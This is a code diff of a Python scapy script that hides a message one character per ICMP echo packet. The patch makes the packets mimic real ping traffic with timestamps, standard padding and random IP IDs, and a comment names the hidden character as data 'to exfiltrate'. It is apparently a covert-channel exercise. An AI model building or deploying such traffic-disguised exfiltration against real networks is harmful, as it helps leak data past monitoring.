@@ -8,6 +8,7 @@ import time
 import random
 import subprocess
 from typing import Optional, Dict
+import struct
 
 from scapy.all import IP, ICMP, Raw, send, conf  # type: ignore
 
@@ -72,32 +73,40 @@ def print_ping_fields(title: str, fields: Dict[str, str]):
 
 # ---------- Payload ICMP con padding ----------
 
-def make_icmp_payload(ch: str, total_len: int = 48) -> bytes:
-    """
-    Construye un payload ICMP de 'total_len' bytes.
-    - Primer byte: el carácter 'útil' (ASCII). Si no es ASCII, usa '?'.
-    - Resto: plantilla idéntica al ping real de macOS: 0x08 .. 0x07+total_len.
-      (Para 48 bytes: 0x08..0x37)
-    """
-    if total_len <= 0:
-        return b""
+import struct
+import time
 
-    # Plantilla (pattern) estilo macOS que viste en Wireshark
-    template = bytes((i & 0xFF) for i in range(0x08, 0x08 + total_len))
+def make_icmp_payload(ch: str, total_len: int = 56) -> bytes:
+    """
+    Construye un payload ICMP de `total_len` bytes imitando el comportamiento de ping(8).
+    Los primeros 8 bytes contienen la marca de tiempo actual: 4 bytes con los segundos
+    y 4 bytes con los microsegundos. A continuación se utiliza el patrón 0x10..0x37,
+    y se inserta el carácter a exfiltrar en la primera posición del patrón (índice 8).
+    """
+    if total_len <= 8:
+        return b''
 
-    # Carácter útil (1 byte)
+    # Obtener timestamp actual (segundos y microsegundos)
+    now = time.time()
+    secs = int(now)
+    usecs = int((now - secs) * 1_000_000)  # microsegundos
+    timestamp = struct.pack('!II', secs, usecs)  # 8 bytes en big‑endian
+
+    # Generar plantilla para el resto (0x08, 0x09, ... hasta 0x37)
+    pattern = bytes(((0x08 + i) & 0xFF) for i in range(total_len - 8))
+
+    # Construir payload completo
+    payload = bytearray(timestamp + pattern)
+
+    # Insertar el carácter en la posición 8 (primer byte del patrón)
     try:
-        useful = ch.encode("ascii", errors="strict")[0:1]
-        if not useful:
-            useful = b'?'
+        useful = ch.encode('ascii', errors='strict')[0]
     except Exception:
-        useful = b'?'
+        useful = ord('?')
+    if len(payload) > 8:
+        payload[8] = useful
 
-    # Reemplaza SOLO el primer byte por el carácter útil
-    # (1 byte de mensaje + padding "legítimo")
-    payload = useful + template[1:]
-    # Asegura longitud exacta
-    return payload[:total_len]
+    return bytes(payload[:total_len])
 
 def send_icmp_chars(message: str, dest: str, base_ttl: int = 64,
                     delay_range=(0.2, 0.6), payload_len: int = 48):
@@ -108,7 +117,10 @@ def send_icmp_chars(message: str, dest: str, base_ttl: int = 64,
 
     for ch in message:
         data = make_icmp_payload(ch, total_len=payload_len)
-        pkt = IP(dst=dest, ttl=base_ttl) / ICMP(type=8, code=0, id=icmp_id, seq=icmp_seq) / Raw(load=data)
+        ipid = random.randint(0, 0xFFFF)   # Genera un identificador aleatorio como en tu ping real
+        pkt = IP(dst=dest, ttl=base_ttl, id=ipid) / \
+            ICMP(type=8, code=0, id=icmp_id, seq=icmp_seq) / \
+            Raw(load=data)        
         send(pkt, verbose=0)
 
         print(("Sent 1 packets." if toggle_cap else "sent 1 packets."))
@@ -138,12 +150,13 @@ def main():
 
     message = sys.argv[1]
     dest = sys.argv[2] if len(sys.argv) >= 3 else "8.8.8.8"
-    payload_len = int(sys.argv[3]) if len(sys.argv) >= 4 else 48  # 48 por tu captura
+    payload_len = int(sys.argv[3]) if len(sys.argv) >= 4 else 56  
 
     # Ping real previo (para comparar)
     before = run_ping_once(dest, size=None)
     print_ping_fields("Ping real (previo)", before)
 
+    
     base_ttl = infer_base_ttl_from_reply(dest)
 
     # Envío 1 char por paquete con padding hasta payload_len bytes
